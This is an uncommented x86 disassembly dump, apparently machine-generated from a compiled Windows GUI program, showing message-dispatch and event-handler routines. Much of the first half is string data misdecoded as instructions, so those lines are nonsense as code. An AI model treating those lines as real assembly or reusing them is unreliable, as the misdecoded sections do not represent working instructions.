jae r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push eax
jb r-xdata
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ ebp - 0x1dbffc0 ] cl
imul esi [ ebx + 0x70 ] 0x68637461
or [ ecx + 0x44 ] ecx
popad
insd
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
inc ebx
insb
outsd
jae r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
dec ecx
inc esp
jo r-xdata
or [ 0x73694454 ] dl
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
mov eax eax
add al 0x4e
or [ edi ] al
inc ecx
push ebx
add [ edx ] al
popad
add al [ esi + ecx * 2 ]
push esp
add [ esi ] eax
inc ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
popad
jb r-xdata
insd
inc ecx
push 0x61430601
outsd
outsb
jae r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
jo r-xdata
jb r-xdata
aam 0x11
imul esi [ ebx + 0x74 ] 0x6d657449
push edx
jo r-xdata
je r-xdata
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
or [ edx ] dl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
inc edx
outsd
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
dec ecx
je r-xdata
inc eax
add ah cl
adc [ eax ] al
xor al 0xff
inc esi
add [ eax ] cl
adc [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
inc edx
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
inc esp
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
je r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
lea eax [ eax ]
aam 0xfe
inc esi
add [ eax ] cl
adc eax 0x73694454
push edx
jae r-xdata
jb r-xdata
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
jns r-xdata
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ ebp - 0x3fffc0 ] cl
inc esi
add [ eax ] cl
sbb eax 0x73694454
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push ebx
outsb
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
jns r-xdata
inc ecx
push ebx
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push edx
jo r-xdata
insd
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
insd
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push 0x61430601
jns r-xdata
inc esi
outsd
jb r-xdata
insd
inc ecx
push ebx
outsb
jb r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
add [ esi ] eax
dec ecx
je r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax - 0x1 ] bh
insb
insb
add [ ebx ] al
or [ edi ] al
or cl [ eax ]
push edx
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
jb r-xdata
jns r-xdata
add [ eax ] cl
sbb edx [ esp + eax * 2 + 0x69 ]
jae r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax ] dl
add [ edi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push es
je r-xdata
dec ecx
je r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
insd
inc ecx
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
inc ebx
push 0x4e6b6365
popad
insd
jae r-xdata
outsb
inc edx
outsw
jb r-xdata
insd
push edi
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
js r-xdata
outsd
outsb
jae r-xdata
add ecx [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
inc ecx
push ebx
outsb
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
je r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
add al [ esi + ecx * 2 ]
push esp
dec edi
or cl [ edx ]
inc ecx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
or [ ecx ] ah
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add cl [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
inc ecx
je r-xdata
or cl [ edx ]
push esp
dec edi
inc [ esi ]
or [ edx ] dl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
adc [ eax ] eax
int3
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
or [ ecx + 0x44 ] ecx
or cl [ eax ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
or cl [ edx ]
inc ecx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
push 0x65
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
or [ edi + 0x6f ] dl
jb r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
jb r-xdata
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
insd
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
add [ esi ] eax
push es
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
popad
add [ fs : edx ] al
or [ edx ] bl
push esp
inc esp
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
rol [ ecx ] 0x1
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax ] dl
inc edi
add [ eax ] bh
add al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
outsd
outsd
insb
add [ ecx + edx - 0x10ebffc0 ] al
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
aam 0x0
add [ eax ] al
and al 0xe7
inc esi
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
je r-xdata
inc ecx
je r-xdata
push ebx
inc ecx
je r-xdata
insd
dec ecx
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add al cl
jmp r-xdata
inc edx
add [ esi ] eax
inc ecx
je r-xdata
popad
jbe r-xdata
add [ 0x73694454 ] cl
je r-xdata
add [ esi ] ah
add al [ edi ]
inc edx
outsw
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
dec ecx
inc edx
outsw
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
inc esi
add ah cl
adc [ eax ] al
nop
sub [ ecx ] al
inc edi
add [ eax ] cl
sbb [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
adc [ eax ] eax
adc al 0xef
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add al [ es : edi ]
inc esp
insb
adc [ eax ] eax
int3
je r-xdata
add ecx [ eax ]
pop es
je r-xdata
add [ ebx ] al
or [ edi ] al
inc esi
add [ eax + r-xdata ] dl
or [ ebx ] bl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
outsd
outsd
inc edx
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
outsb
dec edi
jo r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
cmp [ edx ] al
inc edi
add [ edi ] al
or eax 0x73694454
je r-xdata
inc esi
add [ eax + 0x8004700 ] bh
and [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
inc ecx
push ebx
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
or al [ ecx + ecx * 2 ]
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
dec ecx
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
push es
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
or [ edi + 0x6e ] ecx
outsb
test al 0xfc
inc esi
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0006 ] al
outsb
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ esi ] cl
dec edi
imul esi [ ebx + 0x74 ] 0x6d657449
rol [ ecx ] 0x1
inc edi
add ah dl
out 0x46 eax
add [ 0x754f0900 ] dl
je r-xdata
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x3fffb8f2 ] ah
test al 0x41
add [ eax - 0x1 ] dl
inc ecx
pushfd
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
insd
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
pop es
popad
jb r-xdata
add [ eax ] al
or [ ecx ] 0x0
je r-xdata
dec edi
outsd
outsd
imul ebx [ eax + 0x50 ] 0x10
add [ esp + edi * 8 + 0x46 ] ah
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120010 ] al
outsb
inc edx
outsw
jb r-xdata
jns r-xdata
or [ ebx ] 0x0
push es
dec edi
fdivr st5
inc esi
add [ eax ] dh
add bh bh
jo r-xdata
dec edi
add [ edi ] al
and dh bh
inc esi
add [ eax ] bh
add bh bh
js r-xdata
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f070009 ] al
outsb
inc ebx
jne r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
and al 0xfd
inc esi
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f160007 ] al
outsb
je r-xdata
add bh bh
rol [ eax ] 0x0
inc ebx
push 0x4e6b6365
outsb
push edx
popad
jo r-xdata
add [ eax ] al
inc [ esi ]
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000d ] al
jo r-xdata
outsb
inc esi
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000c ] al
pop es
dec edi
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
jns r-xdata
jo r-xdata
adc [ edi + 0x6e ] cl
insd
push eax
jb r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46ed48
lea eax [ ebx + 0x9c ]
mov edx [ ebp - 0x4 ]
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0011 ] al
outsb
inc ecx
je r-xdata
add [ edi ] al
mov al 0x0
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
cmovg ebp [ esi + 0x41 ]
popad
insd
jae r-xdata
arpl [ gs : ebx + 0x4e ] bp
jb r-xdata
insb
insb
xor bh bh
inc esi
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
outsb
push edx
jo r-xdata
add [ edx ] cl
dec edi
jb r-xdata
jb r-xdata
jo r-xdata
mov ecx r-xdata
call sub_405a10
sbb [ eax + eax + 0x558b0000 ] 0xfffffffc
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
push cs
dec edi
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
adc [ edi + 0x6e ] cl
je r-xdata
inc [ esi ]
mov al [ 0xffffffffa0ff0000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000f ] al
outsb
push edi
inc esi
add [ eax - 0x5f010000 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000e ] al
outsb
push ebx
outsb
je r-xdata
add [ eax ] al
[ eax + 0x1ff0000 ]
jns r-xdata
add [ eax + 0x4f10000a ] al
jb r-xdata
add [ eax ] al
popad
jbe r-xdata
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
inc esp
insb
je r-xdata
add [ eax + 0x4f160013 ] al
outsb
inc edx
outsw
jb r-xdata
add [ eax ] al
inc ecx
je r-xdata
pushad
add [ edi ] al
mov eax 0xb8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100012 ] al
outsb
jne r-xdata
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x9c ] 0x0
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
mov esp 0xa80046ff
add [ eax ] al
[ eax + 0x1ff0000 ]
push edx
jo r-xdata
push 0x65676e61
dec esp
jns r-xdata
popad
outsb
dec esp
jns r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
lea edx [ ebp - 0x4 ]
mov [ fs : eax ] edx
push sub_47053f
call 0xffffffff83d50510
pushfd
add [ eax ] al
add [ ebx + 0x44b9fc55 ] cl
add eax 0xeee80047
push esp
stc
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
outsb
inc edx
and al 0x1
inc edi
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0014 ] al
stc
inc ebx
jmp sub_4039a0
mov edx rw-data
mov [ eax + 0x30 ] edx
retn
outsw
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
popad
mov ah 0x0
inc edi
add al al
add [ eax ] al
inc eax
add [ eax ] al
add [ eax + 0x4f06000b ] al
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push 0x65676e61
js r-xdata
js r-xdata
inc esi
outsd
jb r-xdata
inc esi
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090008 ] al
outsb
sub_4704dc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x9c ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47053f
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46ed48
lea eax [ ebx + 0x9c ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_405a10
sub_470543
add [ ecx ] al
xor [ esi ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebx
mov ebx eax
cmp [ ebx + 0x9c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x9c ]
mov eax ebx
call sub_46ed64
cmp [ ebx + 0x98 ] 0x0
je r-xdata
lea eax [ ebx + 0x9c ]
call sub_4059cc
mov eax ebx
call sub_47084c
sub_47058c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x9c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x9c ]
call sub_4059e4
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
sub_4705b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46eb24
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4705ec
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46eb78
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_470614
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_47081c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edx 0xf006
jg r-xdata
sub edx 0xf007
je r-xdata
je r-xdata
cmp [ ebx + 0x7a ] 0x0
je r-xdata
sub edx 0xa63
je r-xdata
cmp [ ebx + 0x72 ] 0x0
je r-xdata
cmp edx 0xf003
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470823
lea eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a50
lea eax [ ebp - 0xc ]
call sub_4059cc
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a50
retn
mov edx ebx
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
jmp r-xdata
cmp [ ebx + 0x82 ] 0x0
je r-xdata
dec edx
je r-xdata
mov edx ebx
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
jmp r-xdata
sub edx 0xf004
je r-xdata
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405a10
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
jmp r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
sub edx 0x25
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0x5a ] 0x0
je r-xdata
sub edx 0xffffffff
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405a10
mov ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
cmp [ ebx + 0x92 ] 0x0
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ esi ]
call sub_413544
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
jmp r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
jmp r-xdata
sub edx 0xf003
je r-xdata
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
lea eax [ ebp - 0xc ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405a10
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
jmp r-xdata
cmp [ ebx + 0x52 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
mov edx [ esi ]
call sub_413544
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
jmp r-xdata
sub_47084c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039a0#5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_47058c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x50 ]
call sub_405adc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470897
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
sub_4708a8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039a0#4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xd0 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47090b
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46ed48
lea eax [ ebx + 0xd0 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_405a10
sub_47090f
add [ ecx ] ah
xor [ esi ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebx
mov ebx eax
cmp [ ebx + 0xd0 ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xd0 ]
mov eax ebx
call sub_46ed64
lea eax [ ebx + 0xd0 ]
call sub_4059cc
sub_470948
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46eb24
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_470980
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46eb78
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_4709a8
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039a0#3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edx 0xf009
jg r-xdata
cmp edx 0xf466
jg r-xdata
je r-xdata
sub edx 0xf467
je r-xdata
je r-xdata
cmp [ ebx + 0x7a ] 0x0
je r-xdata
cmp edx 0xf004
jg r-xdata
cmp [ ebx + 0x92 ] 0x0
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
sub edx 0xf00a
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470da5
lea eax [ ebp - 0x2c ]
call sub_4059cc
lea eax [ ebp - 0x28 ]
mov edx [ r-xdata ]
mov ecx 0x3
call sub_404a50
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a50
lea eax [ ebp - 0x14 ]
call sub_4046a8
lea eax [ ebp - 0x10 ]
call sub_4059cc
lea eax [ ebp - 0xc ]
call sub_4046a8
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a50
retn
lea eax [ ebp - 0x14 ]
mov edx [ esi ]
call sub_412ea0
mov ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
jmp r-xdata
sub edx 0xf005
je r-xdata
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ esi ]
call sub_413544
mov ecx [ ebp - 0x1c ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
jmp r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
sub edx 0x60d
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ esi ]
call sub_413544
mov ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
cmp [ ebx + 0xaa ] 0x0
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0x9a ] 0x0
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0x72 ] 0x0
je r-xdata
sub edx 0xffffffff
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ esi ]
call sub_413544
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
jmp r-xdata
cmp [ ebx + 0xca ] 0x0
je r-xdata
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
jmp r-xdata
cmp [ ebx + 0xb2 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
jmp r-xdata
cmp [ ebx + 0x5a ] 0x0
je r-xdata
sub edx 0x2
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
jmp r-xdata
sub edx 0xf002
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
lea eax [ ebp - 0x2c ]
mov edx [ esi ]
call sub_413544
mov ecx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
lea eax [ ebp - 0x20 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405a10
mov ecx [ ebp - 0x20 ]
mov edx ebx
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
jmp r-xdata
cmp [ ebx + 0xba ] 0x0
je r-xdata
dec edx
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ esi ]
add edx 0x10
call sub_413544
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x28 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ esi ]
call sub_413544
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
jmp r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebx + 0x82 ] 0x0
je r-xdata
dec edx
je r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405a10
mov ecx [ ebp - 0x24 ]
mov edx ebx
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
jmp r-xdata
cmp [ ebx + 0xc2 ] 0x0
je r-xdata
jmp r-xdata
lea eax [ ebp - 0xc ]
